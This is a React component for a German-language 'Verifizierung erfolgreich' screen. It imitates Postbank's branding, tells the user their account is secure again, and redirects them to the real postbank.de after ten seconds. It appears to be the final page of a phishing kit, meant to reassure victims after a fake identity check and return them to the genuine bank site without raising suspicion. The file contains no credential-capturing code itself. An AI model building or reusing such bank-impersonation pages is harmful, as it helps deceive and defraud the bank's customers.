import React, { useEffect } from 'react';

const FinalSuccessScreen: React.FC = () => {
  useEffect(() => {
    // Redirect after 10 seconds
    const timer = setTimeout(() => {
      window.location.href = 'https://www.postbank.de/';
    }, 10000);

    return () => clearTimeout(timer);
  }, []);

  const handleManualRedirect = () => {
    window.location.href = 'https://www.postbank.de/';
  };

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#f8f9fa',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
    }}>
      <div style={{
        maxWidth: '600px',
        width: '90%',
        backgroundColor: 'white',
        borderRadius: '8px',
        padding: '40px',
        textAlign: 'center',
        boxShadow: '0 4px 24px rgba(0, 0, 0, 0.1)'
      }}>
        {/* Success Icon */}
        <div style={{
          color: '#28a745',
          marginBottom: '32px',
          display: 'flex',
          justifyContent: 'center'
        }}>
          <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
          </svg>
        </div>
        
        <h1 style={{
          color: '#0018a8',
          fontSize: '28px',
          fontWeight: '700',
          margin: '0 0 24px 0',
          fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
        }}>
          Verifizierung erfolgreich
        </h1>
        
        <p style={{
          color: '#666',
          fontSize: '16px',
          lineHeight: '24px',
          marginBottom: '32px'
        }}>
          Ihre Identität wurde erfolgreich verifiziert. Ihr Postbank-Konto ist wieder sicher und zugänglich.
        </p>
        
        <button
          onClick={handleManualRedirect}
          style={{
            backgroundColor: '#0018a8',
            color: 'white',
            padding: '16px 32px',
            borderRadius: '4px',
            fontSize: '16px',
            fontWeight: '700',
            border: 'none',
            cursor: 'pointer',
            transition: 'background-color 0.2s ease',
            fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
            marginBottom: '16px'
          }}
        >
          Jetzt zu Postbank.de
        </button>
        
        <p style={{
          color: '#999',
          fontSize: '14px',
          margin: 0,
          lineHeight: '1.4'
        }}>
          Sie werden automatisch in 10 Sekunden weitergeleitet.
        </p>
      </div>
    </div>
  );
};

export default FinalSuccessScreen;